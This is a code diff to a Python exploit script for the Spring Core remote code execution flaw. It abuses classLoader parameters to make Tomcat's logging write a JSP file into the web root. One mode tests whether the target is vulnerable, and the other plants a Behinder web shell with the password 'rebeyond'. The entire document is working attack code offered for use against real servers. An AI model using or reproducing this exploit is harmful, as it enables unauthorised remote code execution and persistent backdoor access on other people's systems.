@@ -1,4 +1,5 @@
 import time
+from urllib.parse import urlparse
 import requests
 import random
 import argparse
@@ -13,13 +14,13 @@ def vuln(url):
             "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
             "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
             }
-    requests.post("{}/index".format(url), headers=headers, data=data, proxies=proxies)
+    requests.post(url, headers=headers, data=data)
     print("wait for 6s...")
     time.sleep(6)
-    re2 = requests.get("{}/{}{}.jsp".format(url,prefix,rand))
+    re2 = requests.get("{}/{}{}.jsp".format(location,prefix,rand))
     if "6right" in re2.text:
         print("inject succ , vuln!")
-        print("test is {}/{}{}.jsp".format(url,prefix,rand))
+        print("test is {}/{}{}.jsp".format(location,prefix,rand))
     else:
         print("no vuln!")
 
@@ -33,34 +34,26 @@ def rebeyond(url):
             "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
             "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": rand
             }
-    requests.post("{}/index".format(url), headers=headers, data=data, proxies=proxies)
-    print("rebeyond is {}/{}{}.jsp , passwd is rebeyond".format(url,prefix,rand))
+    requests.post(url, headers=headers, data=data)
+    print("rebeyond is {}/{}{}.jsp , passwd is rebeyond".format(location,prefix,rand))
 
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Srping Core Rce.')
     parser.add_argument('--url',help='target url',required=True)
     parser.add_argument('--type',help='1 vuln test 2.Behinder shell',required=True,type=int)
-    parser.add_argument('--directory',help='target directory',required=False)
-    parser.add_argument('--filename',help='target filename',required=False)
-#     proxies={
-#         "http":"http://127.0.0.1:8080",
-#         "https":"https://127.0.0.1:8080",
-#     }
+    parser.add_argument('--directory',help='target directory',required=False,default="webapps/ROOT")
+    parser.add_argument('--filename',help='target filename',required=False,default="inject")
     sign = "6right"
     headers = {sign: "%",
                "Content-Type": "application/x-www-form-urlencoded"
     }
     suffix = ".jsp"
-    prefix = "inject"
-    directory = r"webapps/ROOT"
     args = parser.parse_args()
-    if args.filename:
-        prefix = args.filename
-    if args.directory:
-        directory = args.directory
-    if args.url and args.type:
-        if args.type == 1:
-            vuln(args.url)
-        elif args.type == 2:
-            rebeyond(args.url)
+    prefix = args.filename
+    directory = args.directory
+    location = urlparse(args.url).scheme + "://" + urlparse(args.url).netloc
+    if args.type == 1:
+        vuln(args.url)
+    elif args.type == 2:
+        rebeyond(args.url)
